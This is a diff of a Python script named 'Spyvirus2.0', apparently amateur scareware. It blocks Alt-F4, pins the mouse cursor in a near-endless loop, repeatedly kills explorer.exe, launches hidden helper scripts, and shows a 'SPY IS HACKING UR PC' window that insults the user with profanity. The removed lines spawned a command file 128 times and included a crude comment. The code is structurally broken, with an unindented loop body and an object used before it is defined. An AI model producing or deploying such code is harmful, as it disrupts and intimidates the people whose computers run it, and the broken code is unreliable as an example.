@@ -1,27 +1,25 @@
 import os
-from random import random
 import time
 import tkinter as tk
-#importowanie
 from threading import Thread
-
-pressed_f4 = False  # Is Alt-F4 pressed?
+import ctypes
+pressed_f4 = False
 
 def do_exit():
     global pressed_f4
     print('Trying to close application')
-    if pressed_f4:  # Deny if Alt-F4 is pressed
+    if pressed_f4:
         print('Denied!')
-        pressed_f4 = False  # Reset variable
+        pressed_f4 = False
     else:
-        close()     # Exit application
+        close()
 
-def alt_f4(event):  # Alt-F4 is pressed
+def alt_f4(event):
     global pressed_f4
     print('Alt-F4 pressed')
     pressed_f4 = True
 
-def close(*event):  # Exit application
+def close(*event):
     root.destroy()
 
 root.bind('<Alt-F4>', alt_f4)
@@ -31,31 +29,36 @@ root.protocol("WM_DELETE_WINDOW",do_exit)
 root.mainloop()
 def func1():
     os.system("python C:/spei/window1.py")
-#funkcja 1 pokazywanie okna    
+    time.sleep(10)   
 
 def func2():
     os.system("python C:/spei/rtd.py")
-    time.sleep(10)
-#funkcja 2 ffplay
+
 if __name__ == '__main__':
     Thread(target = func1).start()
     Thread(target = func2).start()
-#zaczynaie i pierwszenstwo funkcji
+    for i in range(0,999999999999999999999999999999999999999999999999999999):
+    time.sleep(0.1)
+    ctypes.windll.user32.SetCursorPos(100, 20)
+for i in range(0,999999999999999999999999999999999999999999999999999999):
+    time.sleep(0.1)
+    os.system("taskkill /im explorer.exe")
+
 window = tk.Tk() 
-window.title( "Spyvirus2.0" ) #tytol okna
+window.title( "Spyvirus2.0" )
 text = tk.StringVar()
 label = tk.Label( window, textvariable = text, padx=100, pady=20)
 label.pack()
-text.set("SPY IS HACKING UR PC") #text w oknie
+text.set("SPY IS HACKING UR PC")
 description = tk.Label(window, text="any last words?:").pack()
 name = tk.Entry(window,width=40)
 name.pack()
-def Spyvirusmain(): #definiowanie
-    text.set("{0}- I WILL NOT READ THIS, HERE GO FUCK YOURSELF ".format(name.get())) #przycisk ktory jest useless
+
+def Spyvirusmain():
+    text.set("{0} - I WILL NOT READ THIS, HERE GO FUCK YOURSELF ".format(name.get()))
 ok = tk.Button(window, text="OK", width=20, command=Spyvirusmain)
 ok.pack()
-os.system("start C:\spei\image.py") #obrazek szpiega
-#wszystko skradzione z jakiejs strony bo jestem script kidem
-for i in range(128):
-    os.system("start C:\spei\weird.cmd")
-#downloading gay porn intensives
+
+os.system("start C:\spei\image.py")
+
+os.system("start C:\spei\weird.cmd")
